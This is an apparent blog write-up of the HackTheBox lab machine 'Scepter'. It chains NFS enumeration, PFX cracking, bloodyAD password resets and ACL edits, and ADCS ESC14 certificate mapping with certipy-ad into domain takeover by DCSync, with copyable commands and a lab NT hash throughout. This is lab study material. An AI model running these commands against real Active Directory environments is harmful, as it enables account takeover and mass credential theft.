---
title: HTB-Scepter
published: 2026-01-24
toc: true
draft: false
tags:
  - ADCS
  - ESC14
  - BloodyAD
  - BloodHound
  - certipy-ad
  - nfs
  - forcechangepassword
  - GenericAll
---

```
Scope:
10.129.244.44
```

# Recon
## Nmap

```bash
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-01-25 01:38:53Z)
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
2049/tcp  open  nlockmgr      syn-ack 1-4 (RPC #100021)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.scepter.htb
| Issuer: commonName=scepter-DC01-CA/domainComponent=scepter
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-01-25T01:39:56+00:00; +6h30m54s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: DNS:dc01.scepter.htb
| Issuer: commonName=dc01.scepter.htb
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49690/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         syn-ack Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack Microsoft Windows RPC
49757/tcp open  msrpc         syn-ack Microsoft Windows RPC
49761/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Right away I noticed that an NFS port was open which is almost always low hanging fruit.

## 2049/TCP - NFS

![](attachments/bdc728abd6d6e5bef83f6f1ffec71441.png)

![](attachments/329da8d49cb66b9d7162a5895cc76688.png)

In order to view the contents I had to be *root*:

![](attachments/f667e8d48dbebc4acf5b1ef42ce2d4e1.png)

I copy them over to my `/home` directory and convert the `pfx` files to hashes. In turn I am able to crack them using `john`:

![](attachments/28be040093d763e52b3ec57dccf58ecc.png)

I tried to export the `pfx` file in order to get a TGT but failed miserably:

![](attachments/3042b5ad9ba47814c1ff02433d6423f3.png)

However this did show me the naming convention of the domain -> *e.lewis* which meant I could now attempt a `kerbrute` user enumeration. For this I will be mutating a wordlist first:

```bash
sed 's/^\(.\)/\1./' /usr/share/seclists/Usernames/statistically-likely-usernames/jsmith.txt > j.smith.txt
```

![](attachments/ebcd423dcfe2f161e19284c77ddca638.png)

It did get us a couple of users. I tried spraying the password and it didn't seem to work for any of the found users, however one account did seem to be restricted:

![](attachments/937fe01c97c6fdf6e21a11eaecca9b45.png)

## PFX certificate bundle

Since none of the above worked I returned to the `baker.crt` and `baker.key` files. Using the password phrase that we cracked, `newpassword`, I was able to write the RSA key.

```bash
openssl rsa -in baker.key -out decrypted.key
```

![](attachments/bcafad62fddd6c56e28d4b677bd80f5a.png)

I then appended the certificate info into the `baker.pem` file:

![](attachments/b8ec4b7c57ce68df1d21bc574f457797.png)

Next up I ran the following command:

```bash
openssl pkcs12 -in baker.pem -keyex -CSP  "Microsoft Enhanced Cryptographic Provider v1.0" -export -out baker.pfx
```

>[!important]
>Leave the export password blank!

![](attachments/f6cf0b52f5f79ccf78ee26fb89d45283.png)

Now we can auth as baker:

![](attachments/468555a30a77bed990ce5c8856da3f4e.png)

```
d.baker
18b5fb0d99e7a475316213c15b6f22ce
```

## nxc

Now I was able to start fully enumerating the system:

![](attachments/36e7c531df84d88c6913132a27940f29.png)

Unfortunately there was nothing interesting on the shares:

![](attachments/f44a517d26517ffd2cbb729de3bcfe77.png)

## BloodHound

Time for some `bloodhound` enumeration:

![](attachments/083b4266545e7cff2139135e71474020.png)

### ForceChangePassword

![](attachments/93dc5e3d3fc12165576d67119edb9974.png)

This is easily done with `bloodyAD`:

```bash
bloodyAD --host 10.129.244.44 -d scepter.htb -u 'd.baker' -p ':18b5fb0d99e7a475316213c15b6f22ce' set password 'a.carter' 'P@ssword123!'
```

![](attachments/ac15ecf035951e06a1578024246466f8.png)

### GenericAll on OU

As per the [bloodhound wiki](https://bloodhound.specterops.io/resources/edges/generic-all#with-genericall-over-an-ou) 

![](attachments/b9dcac04909fbe468bb6c542b8ad8218.png)

This can be done as follows:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'P@ssword123!'
```

![](attachments/c7d6eb23d9ca66509b55cf0085a3e92d.png)

# Exploitation
## ADCS - ESC14

Continuing on I check out the certificate templates using `certipy-ad`:

```bash
certipy-ad find -u d.baker -hashes :18b5fb0d99e7a475316213c15b6f22ce  -dc-ip 10.129.244.44 -stdout -vulnerable
```

![](attachments/b948f7a75700c5d25a811018fd307376.png)

At the bottom I notice that the target is vulnerable to **ESC9**:

![](attachments/99ef4e5d1a83546351ba5841f2e2deb7.png)

I also noticed the following:

![](attachments/9d9097174bcacc7e558efde4918a16cb.png)

This is an interesting find but we need to enumerate further to make this work.

### altSecurityIdentities

We can search for `altSecurityIdentities` using the following `nxc` command with `ldap` query:

```bash
nxc ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(&(objectCategory=person)(objectClass=user)(altSecurityIdentities=*))" "" 
```

![](attachments/2de48ec35c6cca1bcf52c2d950d8d27a.png)

I see that this outputs the *h.brown* user who has it set. I can exploit this using `bloodyAD`:

```bash
bloodyAD --host 10.129.244.44 -d scepter.htb -u 'a.carter' -p 'P@ssword123!' add genericAll 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' a.carter

bloodyAD --host 10.129.244.44 -d scepter.htb -u 'a.carter' -p 'P@ssword123!' set object d.baker mail -v h.brown@scepter.htb
```

![](attachments/691dfb1f317a2095467df57938010d0d.png)

>[!note]
>The LDAP query shows that **h.brown** has `altSecurityIdentities` set to an **X.509 RFC822 mapping**, meaning any certificate containing the email `h.brown@scepter.htb` can authenticate as that user without knowing their password.

Next up we can request the certificate:

```bash
certipy-ad req -username 'd.baker@scepter.htb' -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.129.244.44
```

![](attachments/1bf90f6565ea6cb1969c0d0634d03f93.png)

We can now auth as *h.brown* through this cert:

```bash
certipy-ad auth -pfx d.baker.pfx -dc-ip 10.129.244.44 -domain scepter.htb -username h.brown
```

![](attachments/6f8b929c9f682f2b3f8c43c25feb4476.png)

There's just a small problem however...

![](attachments/bc8917273b601476c9372f7f9cfc1bf3.png)

As mentioned earlier on in the writeup, this account is **restricted** since it is inside the **Protected Users** group.

![](attachments/4cab15ab78b246860c42977777e2c963.png)

# Foothold
## Shell as h.brown

No biggy though as we can easily login using the `ccache` file:

```bash
KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb
```

![](attachments/3d01a8f839cece5934e09df4e96e3b13.png)

### user.txt

![](attachments/c31edcd91062d67de26ce77cc9159d08.png)

# Privilege Escalation
## ADCS - ESC14 (v2.0)

When checking the **Shortest Paths to Admin** query on `bloodhound` I noticed the following:

![](attachments/9cdc4e178d7051bc50c0444da6f7a899.png)

Turns out that the *p.adams* user has quite interesting privs here, let's check out the **Helpdesk Enrollment Certificate** template.

![](attachments/fa8c83e179c8d1f42fc890d006aac1aa.png)

Looks like only users in the **Admin** groups can write to it, unless...

```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -k get writable --detail
```

![](attachments/bc51e7d21f55c2455950332f4e5def4c.png)

Terribly convenient, let's exploit this.

![](attachments/00bee592661dcddbb157fe36488fb29f.png)

Since *p.adams* does not have an **altSecurityIdentities** set we can use the one from *h.brown*:

```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -k set object 'p.adams' altSecurityIdentities -v 'X509:<RFC822>h.brown@scepter.htb'
```

![](attachments/9d1c9d6654ec2012631288c8dea8cdd6.png)

Accordingly we'll set *d.baker*'s mail again to match it:

```bash
bloodyAD --host 10.129.244.44 -d scepter.htb -u 'a.carter' -p 'P@ssword123!' set object d.baker mail -v h.brown@scepter.htb
```

![](attachments/6f1cae5b5fe213e35117a964b04583b5.png)

And we can request the certificate:

```bash
certipy-ad req -username 'd.baker@scepter.htb' -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.129.244.44
```

![](attachments/4d2171d39d1816598b8b4d79e799ba7e.png)

This certifcate can now be used to authenticate as *p.adams*:

![](attachments/a0a56d8fa1d0b1a848fc8b2391f0e825.png)

## DCSync

Since we earlier found that we can `DCSync` we can just go ahead and run `impacket-secretsdump` in order to dump the `ntds.dit`:

![](attachments/7d5128b79576e146a2f329b71b764184.png)

![](attachments/d78fbb384a8aa17f48d61e09039bfd91.png)

The same can be achieved through `nxc`:

![](attachments/09a5de5c2086ab509d69f6acb50c8494.png)

### root.txt

![](attachments/2cfa09564a78c3a466137ae0cfe09436.png)

![](attachments/b5afc75a4a444ecfd5c2dccd3f7b7d09.png)

---
